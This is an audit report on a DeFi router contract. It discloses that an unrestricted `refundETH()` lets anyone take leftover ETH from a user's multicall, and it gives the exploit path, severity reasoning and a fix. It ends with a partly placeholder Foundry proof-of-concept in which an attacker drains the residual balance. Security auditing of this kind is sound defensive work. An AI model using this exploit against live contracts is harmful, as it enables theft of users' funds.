Audit Report

## Title
Unguarded `refundETH()` allows any caller to drain residual ETH left on the router after a multicall — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

## Summary

`refundETH()` has no access control and unconditionally transfers the router's entire native ETH balance to `msg.sender`. Because `multicall` is `payable` and `pay()` wraps only the exact `value` needed for a swap, any excess ETH sent by a user remains on the contract. A user who omits `refundETH()` from their multicall batch leaves residual ETH that any attacker can steal in a subsequent transaction.

## Finding Description

`refundETH()` is defined without any caller restriction: [1](#0-0) 

It sends the **entire** `address(this).balance` to `msg.sender` with no check that the caller is the original depositor.

ETH enters the router via `multicall`, which is `payable`: [2](#0-1) 

Inside `pay()`, when `token == WETH` and `nativeBalance >= value`, only exactly `value` ETH is wrapped and forwarded; the remainder (`nativeBalance - value`) stays as raw ETH on the contract: [3](#0-2) 

The `receive()` guard that rejects non-WETH senders does **not** apply here — ETH sent alongside a `payable` function call bypasses `receive()` entirely: [4](#0-3) 

Exploit path: victim calls `multicall{value: 1 ETH}([exactInputSingle(..., amountIn=0.5 ETH)])` without appending `refundETH()`. `pay()` wraps 0.5 ETH; 0.5 ETH remains on the router. Attacker calls `refundETH()` in a separate transaction and receives the full residual balance.

## Impact Explanation

Direct theft of user ETH principal. Any residual ETH left on the router between transactions is immediately claimable by an arbitrary caller. There is no minimum threshold — the full residual amount is transferred. This constitutes a critical/high direct loss of user principal under Sherlock contest thresholds.

## Likelihood Explanation

- `multicall` is the standard batching entry point; users routinely send excess ETH to cover slippage.
- Omitting `refundETH()` from a multicall is a realistic user mistake — no on-chain mechanism enforces its inclusion.
- The attack requires no special privileges: any EOA or contract can call `refundETH()`.
- MEV bots monitoring the router's ETH balance or the mempool will reliably extract residual ETH within the same block.

## Recommendation

Restrict `refundETH()` so it can only be called as part of a `multicall` (i.e., add a `msg.sender == address(this)` guard, since `multicall` uses `delegatecall`). Alternatively, track deposited amounts per address using a mapping or transient storage so that `refundETH()` can only return ETH to the original depositor.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import "forge-std/Test.sol";
import {MetricOmmSimpleRouter} from "metric-periphery/contracts/MetricOmmSimpleRouter.sol";

contract RefundETHTheftTest is Test {
    MetricOmmSimpleRouter router;
    address victim   = address(0xBEEF);
    address attacker = address(0xBAD);

    function setUp() public {
        router = new MetricOmmSimpleRouter(WETH_ADDR, FACTORY_ADDR);
    }

    function testAttackerStealsResidualETH() public {
        // Victim sends 1 ETH via multicall; swap consumes only 0.5 ETH;
        // no refundETH() appended to the batch.
        vm.deal(victim, 1 ether);
        vm.prank(victim);
        bytes[] memory calls = new bytes[](1);
        calls[0] = abi.encodeCall(router.exactInputSingle, (/* amountIn=0.5 ETH params */));
        router.multicall{value: 1 ether}(calls);

        // Router holds 0.5 ETH residual.
        assertEq(address(router).balance, 0.5 ether);

        // Attacker drains it in a separate transaction.
        vm.prank(attacker);
        router.refundETH();

        assertEq(attacker.balance, 0.5 ether);
        assertEq(address(router).balance, 0);
    }
}
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L58-63)
```text
  function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
      _transferETH(msg.sender, balance);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L74-78)
```text
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L39-44)
```text
  function multicall(bytes[] calldata data) public payable override returns (bytes[] memory results) {
    results = new bytes[](data.length);
    for (uint256 i = 0; i < data.length; i++) {
      results[i] = Address.functionDelegateCall(address(this), data[i]);
    }
  }
```
